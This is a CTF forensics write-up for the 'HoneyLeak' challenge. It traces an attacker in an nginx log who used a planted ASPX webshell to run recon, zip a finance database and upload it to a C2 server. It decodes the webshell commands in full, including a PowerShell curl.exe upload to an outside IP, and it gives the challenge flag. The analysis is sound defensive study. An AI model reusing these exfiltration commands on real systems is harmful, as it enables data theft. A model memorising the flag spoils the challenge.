# Не пойман — не медоед (HoneyLeak) — Independent analysis (FABLE)

**Category:** Forensics (Easy/Baby) · Avito CTF 2026 · @mrvos/SPbCTF
**Artifact:** `/Users/mmk/github/avitoctf2026/honeyleak_access.log` (56,873 lines nginx access log, 03/Jul/2026 15:00–22:59 UTC)

## FLAG
```
avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}
```
This is the secret the bees hid inside the corporate accounting DB (`secrets` table, key `incident_flag`).

> **Cross-check note / disagreement:** the pre-existing `FLAG.txt` contained `avito{S7m!vQ2@rK9Lp4X_2026}`. That string is the **7-Zip archive password**, NOT the hidden secret. The task asks for "the secret the bees hid inside the accounting DB", which requires actually retrieving + decrypting the exfiltrated archive. Doing so yields the flag above. The password is only the means to open the archive. I overwrote `FLAG.txt` with the verified value.

---

## How the attacker was found (independent method)

### 1. Traffic profile
- **12 "regular traffic" IPs** (~2700–2850 req each) rotating many real browser UAs, hitting real app endpoints: `/api/news`, `/api/products`, `/products`, `/about`, `/articles/2026/q2`, `/assets/*`, `/healthz`, `/metrics`, `/sitemap.xml`, `/robots.txt`, `/contacts`.
- **12 scanner IPs** (~1140–1225 req each) rotating scanner UAs: masscan, sqlmap, ffuf, wfuzz, gobuster, feroxbuster, dirsearch, DirBuster, Nmap NSE, python-requests, Go-http-client. These spray DB/dump/backup one-offs (`/users.sql.gz`, `/db_backups/`, `/mysql.zip`, …) and get 403/404/405.
- Methods present: only GET/HEAD/OPTIONS (no POST) — so no upload is visible in-log; the webshell was pre-planted.

### 2. The tell: a 200 where scanners got 403/404, on a non-scanner/non-browser UA
Filtering 200s on non-standard paths surfaced `GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64>` returning **200 four times**. Every other suspicious path returned 403/404/405.

- The 4 hits all came from **IP `185.193.88.77`** with UA **`Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)`**.
- That Trident/6.0 UA appears **only** from this one IP, **only** 4 times in the entire log (`grep 'Trident/6.0'` → 4 lines, all `185.193.88.77`).
- The **same IP** also emitted ~1166 decoy scanner requests (ffuf 132, gobuster 118, Go-http 116, DirBuster 107, Nmap 105, python-requests 104, feroxbuster 99, Wfuzz 99, sqlmap 98, masscan 98, dirsearch 86) spread across the whole 15:00–22:59 window to **blend in**. The real attack is the 4 Trident-UA webshell calls.

### 3. Kill chain (cited log lines, all `185.193.88.77`, all HTTP 200)
`/aspnet_client/system_web/healthcheck.aspx` is a planted ASPX webshell taking a base64 `cmd`.

| ts (UTC) | bytes | decoded command |
|---|---|---|
| 18:40:17 | 2018 | `whoami && hostname && ipconfig \| findstr /R "IPv4"` (recon) |
| 18:41:05 | 1600 | `powershell -c "$ts=(Get-Date).ToUniversalTime().ToString('yyyyMMdd_HHmm'); & C:\tools\7z.exe a -tzip (\"C:\Windows\Temp\blob_$ts.tmp\") C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql -pS7m!vQ2@rK9Lp4X_2026"` (zip the DB, password-protected) |
| 18:42:11 | 1204 | `powershell -c "$ts=...; curl.exe -F \"file=@C:\Windows\Temp\blob_$ts.tmp\" http://178.154.230.44/upload.php"` (exfil to C2) |
| 18:42:37 | 968 | `powershell -c "curl.exe -s http://178.154.230.44/ \| findstr /I blob_"` (verify the blob landed on C2) |

Raw lines:
```
185.193.88.77 - - [03/Jul/2026:18:40:17 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=d2hvYW1p... HTTP/1.1" 200 2018 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
185.193.88.77 - - [03/Jul/2026:18:41:05 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=cG93ZXJz...(7z zip)... HTTP/1.1" 200 1600 "-" "...Trident/6.0)"
185.193.88.77 - - [03/Jul/2026:18:42:11 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=cG93ZXJz...(curl -F upload)... HTTP/1.1" 200 1204 "-" "...Trident/6.0)"
185.193.88.77 - - [03/Jul/2026:18:42:37 +0000] "GET /aspnet_client/system_web/healthcheck.aspx?cmd=cG93ZXJz...(verify)... HTTP/1.1" 200 968 "-" "...Trident/6.0)"
```

### 4. The DB and the C2
- **Exfiltrated DB:** `C:\inetpub\wwwroot\App_Data\corp_finance_2026_07_03.sql` (the corporate accounting DB — "central hive treasury export").
- **Archive password (recovered from the log):** `S7m!vQ2@rK9Lp4X_2026`
- **C2 / drop site:** `http://178.154.230.44/` (still LIVE). `README.txt` = "Public index mirror. Auto cleanup disabled." It is a **honeypot directory listing of 1338 decoy `blob_*` files** with random names, extensions and sizes, all filled with **random bytes** (I downloaded `blob_yi6i57f66y.tmp` from the exfil minute — pure random data, no ZIP header → decoy).

### 5. Finding the real exfil among 1338 decoys
The archive was produced by `7z a -tzip`, so the real file must start with the ZIP signature `PK\x03\x04` (`504b0304`). I range-probed (`curl -r 0-3`) the first bytes of all 1338 blobs. **Exactly one** was a ZIP:
```
504b0304 blob_3po654ppbr.log   (03-Jul-2026 21:42, 12M)
```
Downloaded it, extracted with the recovered password:
```
unzip -P 'S7m!vQ2@rK9Lp4X_2026' blob_3po654ppbr.log
  -> corp_finance_2026_07_03.sql   (664 bytes)
  -> encrypted_database.dat        (12,582,912 bytes, random-looking; not needed for the flag)
```

### 6. The secret inside the accounting DB
`corp_finance_2026_07_03.sql` is a SQLite-style dump. Full content:
```sql
-- central hive treasury export
CREATE TABLE hive_workers (id, bee_name, role, salary_honey_grams);
INSERT INTO hive_workers VALUES (1,'zhuzha','queen_cfo',172000);
INSERT INTO hive_workers VALUES (2,'maya','pollen_analyst',91000);
INSERT INTO hive_workers VALUES (3,'buzz','comb_controller',108500);

CREATE TABLE secrets (id, k, v);
INSERT INTO secrets VALUES (1,'incident_flag','avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}');
INSERT INTO secrets VALUES (2,'note','rotate legacy IIS endpoints before the badgers notice');
```

**Secret / FLAG:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`

---

## Summary
- **Thief:** `185.193.88.77`, UA `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)` (unique in the log), camouflaged behind ~1166 self-generated scanner requests.
- **Vector:** pre-planted ASPX webshell `GET /aspnet_client/system_web/healthcheck.aspx?cmd=<base64>` (4× HTTP 200, 18:40–18:42 UTC).
- **Action:** 7z-zip the accounting DB `corp_finance_2026_07_03.sql` with password `S7m!vQ2@rK9Lp4X_2026`, exfil via `curl -F` to C2 `http://178.154.230.44/upload.php`.
- **Exfil object:** `http://178.154.230.44/blob_3po654ppbr.log` (the single real ZIP among 1338 decoys).
- **Secret in DB:** `avito{c0ngr4t5_0n_cr4ck1ng_th3_sh3ll}`
